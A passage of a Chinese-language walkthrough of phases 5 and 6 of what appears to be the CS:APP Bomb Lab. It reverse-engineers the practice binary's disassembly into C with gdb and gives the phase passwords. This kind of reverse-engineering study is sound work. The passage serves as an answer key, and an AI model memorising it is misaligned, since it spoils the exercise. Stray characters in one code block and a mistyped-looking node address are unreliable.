<p>40107f: <code>cmp $0x6,%eax</code> 和 401082: <code>je 4010d2</code> 判断返回值是否为 <code>6</code>，是则直接跳到 4010d2: <code>mov $0x0,%eax</code>，否则执行 401084: <code>callq 40143a</code> 引爆炸弹。</p>
<p>可见，输入的字符串的长度应当为 <code>6</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line">401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line">401096:   83 e2 0f                and    $0xf,%edx</span><br><span class="line">401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line">4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line">4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi</span><br><span class="line">4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>剩下的内容也就是本关的主体部分。直观起见，试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cur_char = <span class="number">0</span>;                                   <span class="comment">// cur_char in %rcx</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; ++i) &#123;                      <span class="comment">// i in %rax</span></span><br><span class="line">    cur_char = input[i];                        <span class="comment">// input in %rbx</span></span><br><span class="line">    index    = cur_char;                        <span class="comment">// index in %rsp, later copied to %edx</span></span><br><span class="line">    index &amp;= <span class="number">0xf</span>;</span><br><span class="line">    target_char = target[index];                <span class="comment">// target_char in %edx, target in 0x4024b0</span></span><br><span class="line">    word[i]     = target_char;                  <span class="comment">// word in %rsp + 0x10</span></span><br><span class="line">&#125;</span><br><span class="line">word[<span class="number">6</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">result  = strings_not_equal(word, <span class="number">0x40245e</span>);    <span class="comment">// result in %eax</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">0</span>)</span><br><span class="line">    explode_bomb();</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>其中，由 1.2.5 节的分析，函数 <code>strings_not_equal</code> 的作用为检查两个字符串是否相等，是则返回 <code>0</code>，否则返回 <code>1</code>。同时也可以知道 <code>0x40245e</code> 这个地址指向的是一个字符串。</p>
<p>可见，这段代码的作用为：</p>
<ol>
<li>构造一个 6 位的新字符串 <code>word</code>，遍历输入的字符串 <code>input</code> 的 6 个字符，以字符 <code>input[i]</code> 的最低 4 位二进制数为索引 <code>index</code>，依次将 <code>word[i]</code> 设置为字符 <code>target[index]</code>（可以推测出 <code>0x4024b0</code> 这个地址指向的也是一个字符串，这里设为 <code>target</code>），最后将 <code>word[6]</code> 设置为 <code>'\0'</code> 作为字符串结束符；</li>
<li>检查字符串 <code>word</code> 和 <code>0x40245e</code> 指向的字符串是否相等，是则直接返回，否则引爆炸弹。</li>
</ol>
<p>因此，由 <code>0x40245e</code> 指向的字符串倒推得对应的 6 个索引 <code>index</code>，再根据这些 <code>index</code> 得到输入的字符串 <code>input</code> 的 6 个字符，就可以得到本关的密码。</p>
<h5 id="522-确定目标字符串-word-的值"><a class="markdownIt-Anchor" href="#522-确定目标字符串-word-的值"></a> 5.2.2 确定目标字符串 word 的值</h5>
<p>使用 gdb 查看地址 <code>0x40245e</code> 存放的内容：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/s <span class="number">0x40245e</span></span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>
<p>这就是我们需要构造的目标字符串 <code>word</code> 的值。</p>
<h5 id="523-确定-6-个索引-index-的值"><a class="markdownIt-Anchor" href="#523-确定-6-个索引-index-的值"></a> 5.2.3 确定 6 个索引 index 的值</h5>
<p>使用 gdb 查看地址 <code>0x4024b0</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x4024b0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0x4024b0 &lt;array.3449&gt;:  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure>
<p>这就是字符串 <code>target</code> 的值，我们需要将 <code>word[i]</code> 分别设置为字符 <code>target[index]</code>。于是得到对应的 6 个 <code>index</code> 的值为：<code>0x9</code>, <code>0xf</code>, <code>0xe</code>, <code>0x5</code>, <code>0x6</code>, <code>0x7</code>（<code>index</code> 是 4 位二进制数，因此其取值范围为 [0x0, 0xf]）。</p>
<h5 id="524-确定输入的-6-个字符"><a class="markdownIt-Anchor" href="#524-确定输入的-6-个字符"></a> 5.2.4 确定输入的 6 个字符</h5>
<p>由于索引 <code>index</code> 是字符 <code>input[i]</code> 的最后 4 位（二进制），通过 ASCII 码表 [^6] 找到最后 4 位为 <code>index</code> 的字符即可。于是得到对应的 6 个字符为：<code>9</code>, <code>O</code>, <code>N</code>, <code>5</code>, <code>6</code>, <code>7</code>（答案不唯一，这里就不一一列举了）。</p>
<p>因此，本关密码即为 <code>9ON567</code>。</p>
<h5 id="525-测试"><a class="markdownIt-Anchor" href="#525-测试"></a> 5.2.5 测试</h5>
<p>在 gdb 中输入 Phase 5 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9ON567</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Good work!  On to the next...</span><br></pre></td></tr></table></figure>
<h3 id="6-phase-6-linked-lists-pointers-structs"><a class="markdownIt-Anchor" href="#6-phase-6-linked-lists-pointers-structs"></a> 6. Phase 6: linked lists / pointers / structs</h3>
<h4 id="61-本关密码"><a class="markdownIt-Anchor" href="#61-本关密码"></a> 6.1 本关密码</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<h4 id="62-解题过程"><a class="markdownIt-Anchor" href="#62-解题过程"></a> 6.2 解题过程</h4>
<blockquote>
<p>%rdi = input</p>
</blockquote>
<h5 id="620-观察函数-phase_6"><a class="markdownIt-Anchor" href="#620-观察函数-phase_6"></a> 6.2.0 观察函数 phase_6</h5>
<p>在 bomb.asm 中找到函数 <code>phase_6</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_6&gt;:</span><br><span class="line"> 4010f4:   41 56                   push   %r14</span><br><span class="line"> 4010f6:   41 55                   push   %r13</span><br><span class="line"> 4010f8:   41 54                   push   %r12</span><br><span class="line"> 4010fa:   55                      push   %rbp</span><br><span class="line"> 4010fb:   53                      push   %rbx</span><br><span class="line"> 4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line"> 401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line"> 401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line"> 401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line"> 40110b:   49 89 e6                mov    %rsp,%r14</span><br><span class="line"> 40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d</span><br><span class="line"> 401114:   4c 89 ed                mov    %r13,%rbp</span><br><span class="line"> 401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line"> 40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line"> 40111e:   83 f8 05                cmp    $0x5,%eax</span><br><span class="line"> 401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line"> 401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401128:   41 83 c4 01             add    $0x1,%r12d</span><br><span class="line"> 40112c:   41 83 fc 06             cmp    $0x6,%r12d</span><br><span class="line"> 401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line"> 401132:   44 89 e3                mov    %r12d,%ebx</span><br><span class="line"> 401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line"> 401138:   8b 04 84                mov    (%rsp,%rax,4),%eax</span><br><span class="line"> 40113b:   39 45 00                cmp    %eax,0x0(%rbp)</span><br><span class="line"> 40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line"> 401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line"> 401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line"> 40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line"> 40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line"> 401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line"> 401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line"> 401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line"> 40115b:   b9 07 00 00 00          mov    $0x7,%ecx</span><br><span class="line"> 401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line"> 401162:   2b 10                   sub    (%rax),%edx</span><br><span class="line"> 401164:   89 10                   mov    %edx,(%rax)</span><br><span class="line"> 401166:   48 83 c0 04             add    $0x4,%rax</span><br><span class="line"> 40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line"> 40116f:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line"> 401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line"> 401176:   48 8b 52 08             mov    0x8(%rdx),%rdx</span><br><span class="line"> 40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line"> 40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line"> 40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line"> 401183:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line"> 40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line"> 401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line"> 401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line"> 401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx</span><br><span class="line"> 40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line"> 40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line"> 40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line"> 4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> 4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line"> 4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line"> 4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line"> 4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line"> 4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line"> 4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line"> 4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line"> 4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line"> 4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"> 4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line"> 4011d9:   00</span><br><span class="line"> 4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line"> 4011df:   48 8b 43 08             mov    0x8(%rbx),%rax</span><br><span class="line"> 4011e3:   8b 00                   mov    (%rax),%eax</span><br><span class="line"> 4011e5:   39 03                   cmp    %eax,(%rbx)</span><br><span class="line"> 4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line"> 4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line"> 4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line"> 4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line"> 4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line"> 4011fb:   5b                      pop    %rbx</span><br><span class="line"> 4011fc:   5d                      pop    %rbp</span><br><span class="line"> 4011fd:   41 5c                   pop    %r12</span><br><span class="line"> 4011ff:   41 5d                   pop    %r13</span><br><span class="line"> 401201:   41 5e                   pop    %r14</span><br><span class="line"> 401203:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>发现这段代码相当长，所以这里就不逐句分析了，直接逆向工程。</p>
<h5 id="621-第一部分4010f4-~-40110b"><a class="markdownIt-Anchor" href="#621-第一部分4010f4-~-40110b"></a> 6.2.1 第一部分（4010f4 ~ 40110b）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010f4:   41 56                   push   %r14</span><br><span class="line">4010f6:   41 55                   push   %r13</span><br><span class="line">4010f8:   41 54                   push   %r12</span><br><span class="line">4010fa:   55                      push   %rbp</span><br><span class="line">4010fb:   53                      push   %rbx</span><br><span class="line">4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line">401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line">401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">40110b:   49 89 e6                mov    %rsp,%r14</span><br></pre></td></tr></table></figure>
<p>首先读入 6 个整数（详见 2.2.2 节），保存到栈中。</p>
<blockquote>
<p>%rsi = %r13 = %r14 = %rsp<br>
0x00(%rsp) = nums[0]<br>
0x04(%rsp) = nums[1]<br>
0x08(%rsp) = nums[2]<br>
0x0c(%rsp) = nums[3]<br>
0x10(%rsp) = nums[4]<br>
0x14(%rsp) = nums[5]</p>
</blockquote>
<p>其中，<code>nums[0]</code> ~ <code>nums[5]</code> 表示输入的字符串中解析得到的（前）6 个整数。</p>
<h5 id="622-第二部分40110e-~-401151"><a class="markdownIt-Anchor" href="#622-第二部分40110e-~-401151"></a> 6.2.2 第二部分（40110e ~ 401151）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d</span><br><span class="line">401114:   4c 89 ed                mov    %r13,%rbp</span><br><span class="line">401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line">40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line">40111e:   83 f8 05                cmp    $0x5,%eax</span><br><span class="line">401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:   41 83 c4 01             add    $0x1,%r12d</span><br><span class="line">40112c:   41 83 fc 06             cmp    $0x6,%r12d</span><br><span class="line">401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">401132:   44 89 e3                mov    %r12d,%ebx</span><br><span class="line">401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line">401138:   8b 04 84                mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:   39 45 00                cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line">401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line">40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line">401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cur_pos = nums;                              // cur_pos in %r13, nums in %rsp</span></span><br><span class="line">next_index = <span class="number">0</span>;                                 <span class="comment">// next_index in %r12d</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    cur_num = *cur_pos;                         <span class="comment">// cur_pos in %r13, later copied to %rbp</span></span><br><span class="line">    <span class="keyword">if</span> (--cur_num &gt; <span class="number">5</span>)                          <span class="comment">// cur_num in %eax</span></span><br><span class="line">        explode_bomb();</span><br><span class="line">    ++next_index;</span><br><span class="line">    <span class="keyword">if</span> (next_index == <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = next_index; i &lt;= <span class="number">5</span>; ++i) &#123;         <span class="comment">// i in %ebx, later copied to %rax</span></span><br><span class="line">        next_num = nums[i];                     <span class="comment">// next_num in %eax</span></span><br><span class="line">        <span class="keyword">if</span> (next_num == *cur_pos)</span><br><span class="line">            explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line">    ++cur_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这段代码，可以得知输入的 6 个整数需要满足以下条件：</p>
<ol>
<li>减 1 后不能超过 <code>5</code>（无符号数），即其取值范围为 [1, 6]；</li>
<li>必须互不相同。</li>
</ol>
<p>因此，这 6 个整数是 1 ~ 6 的一个全排列。</p>
<h5 id="623-第三部分401153-~-40116d"><a class="markdownIt-Anchor" href="#623-第三部分401153-~-40116d"></a> 6.2.3 第三部分（401153 ~ 40116d）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line">40115b:   b9 07 00 00 00          mov    $0x7,%ecx</span><br><span class="line">401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line">401162:   2b 10                   sub    (%rax),%edx</span><br><span class="line">401164:   89 10                   mov    %edx,(%rax)</span><br><span class="line">401166:   48 83 c0 04             add    $0x4,%rax</span><br><span class="line">40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">begin_pos &#x3D; rsp;                             &#x2F;&#x2F; begin_pos in %r14</span><br><span class="line">end_pos &#x3D; rsp + 6;                              &#x2F;&#x2F; end_pos in %rsi</span><br><span class="line">minuend &#x3D; 7;                                    &#x2F;&#x2F; minuend in %ecx</span><br><span class="line">for (i &#x3D; begin_pos; i !&#x3D; end_pos; ++i) &#123;        &#x2F;&#x2F; i in %rax</span><br><span class="line">    new_num &#x3D; minuend - *i;                     &#x2F;&#x2F; new_num in %edx</span><br><span class="line">    *i      &#x3D; new_num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见，保存在栈中的这 6 个整数 <code>nums[i]</code> 被依次修改成了 <code>7 - nums[i]</code>。</p>
<h5 id="624-第四部分40116f-~-4011a9"><a class="markdownIt-Anchor" href="#624-第四部分40116f-~-4011a9"></a> 6.2.4 第四部分（40116f ~ 4011a9）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40116f:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line"> 401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line"> 401176:   48 8b 52 08             mov    0x8(%rdx),%rdx</span><br><span class="line"> 40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line"> 40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line"> 40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line"> 401183:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line"> 40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line"> 401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line"> 401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line"> 401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx</span><br><span class="line"> 40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line"> 40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line"> 40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line"> 4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx</span><br><span class="line"> 4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line"> 4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>这是本关的主体部分。试译成 C 语言代码（经整理及大量不影响原意的改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; ++i) &#123;          <span class="comment">// i in %rsi</span></span><br><span class="line">    cur_num = nums[i];              <span class="comment">// cur_num in %ecx, nums in %rsp</span></span><br><span class="line">    p_node  = <span class="number">0x6032d0</span>;             <span class="comment">// p_node in %edx</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; cur_num; ++j)   <span class="comment">// j in %eax</span></span><br><span class="line">        p_node = *(++p_node);       <span class="comment">// assure that p_node is always a pointer</span></span><br><span class="line">    ptrs[i] = p_node;               <span class="comment">// ptrs in %rsp + 0x20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见，根据被修改后的这 6 个整数 <code>nums[i]</code>，这段代码在 <code>ptrs[i]</code>（即 <code>*(%rsp + 0x20 + i * 0x8)</code>）中存放经过 <code>nums[i] - 1</code> 次 <code>p_node = *(++p_node);</code> 操作的地址 <code>p_node</code>，其中 <code>p_node</code> 的初始值为 <code>0x6032d0</code>。</p>
<p>可以看出这实际就是将链表的 6 个结点以 <code>nums[i]</code> 为索引顺序存到栈中。每次操作就是将 <code>p_node</code> 指向下一个结点，因此经过 <code>nums[i] - 1</code> 次操作得到的 <code>p_node</code> 就是 <code>nums[i]</code> 号结点的地址 <code>p_node(nums[i])</code>。</p>
<blockquote>
<p>ptrs[i] = p_node(nums[i])</p>
</blockquote>
<p>由之前的分析，<code>nums[i]</code> 是 1 ~ 6 的一个全排列，由此可以得到这 6 个结点的地址。</p>
<p>以进行 1 次操作为例，使用 gdb 查看此时 <code>p_node</code> 的值（原 <code>p_node</code> + <code>0x8</code> 所指向的内容）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;xw 0x6032d8</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6032d8 &lt;node1+8&gt;:     0x006032e0</span><br></pre></td></tr></table></figure>
<p>这就是 2 号结点的地址 <code>p_node2</code>。</p>
<p>用同样的方式得到 6 个结点的地址：</p>
<blockquote>
<p>p_node1 = 0x6032d0<br>
p_node2 = 0x6032e0<br>
p_node3 = 0x6032f0<br>
p_node4 = 0x603300<br>
p_node5 = 0x603310<br>
p_node6 = 0x603220</p>
</blockquote>
<h5 id="625-第五部分4011ab-~-4011d0"><a class="markdownIt-Anchor" href="#625-第五部分4011ab-~-4011d0"></a> 6.2.5 第五部分（4011ab ~ 4011d0）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx</span><br><span class="line"> 4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line"> 4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line"> 4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line"> 4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line"> 4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line"> 4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line"> 4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line"> 4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line"> 4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line"> 4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"> 4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line"> 4011d9:   00</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">123456789b</span>egin_node = *ptrs;                 <span class="comment">// begin_node in %rbx, ptrs in %rsp + 0x20</span></span><br><span class="line">next_pos   = ptrs + <span class="number">1</span>;              <span class="comment">// next_pos in %rax</span></span><br><span class="line">end_pos    = ptrs + <span class="number">6</span>;              <span class="comment">// end_pos in %rsi</span></span><br><span class="line"><span class="keyword">for</span> (cur_node = begin_node; next_pos != end_pos;</span><br><span class="line">     cur_node = next_node) &#123;        <span class="comment">// cur_node in %rcx</span></span><br><span class="line">    next_node       = *next_pos;    <span class="comment">// next_node in %rdx</span></span><br><span class="line">    *(cur_node + <span class="number">1</span>) = next_node;</span><br><span class="line">    ++next_pos;</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>
<p>可见，这段代码的作用为按<strong>在栈中地址由低到高顺序</strong>遍历链表的 6 个结点，将它们串联起来。</p>
<p>这里的 <code>*(cur_node + 1)</code> 实质上就是 <code>cur_node-&gt;next</code>（即 <code>(*cur_node).next</code>），因为链表中的结点其实是一个结构体（struct），结点所在的地址指向的是数据 <code>val</code>，加上 <code>0x8</code> 后指向的也就是指针 <code>next</code>。此处将该指针 <code>next</code> 指向了下一个结点。</p>
<h5 id="626-第六部分4011da-~-401203"><a class="markdownIt-Anchor" href="#626-第六部分4011da-~-401203"></a> 6.2.6 第六部分（4011da ~ 401203）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line">4011df:   48 8b 43 08             mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:   8b 00                   mov    (%rax),%eax</span><br><span class="line">4011e5:   39 03                   cmp    %eax,(%rbx)</span><br><span class="line">4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line">4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line">4011fb:   5b                      pop    %rbx</span><br><span class="line">4011fc:   5d                      pop    %rbp</span><br><span class="line">4011fd:   41 5c                   pop    %r12</span><br><span class="line">4011ff:   41 5d                   pop    %r13</span><br><span class="line">401201:   41 5e                   pop    %r14</span><br><span class="line">401203:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
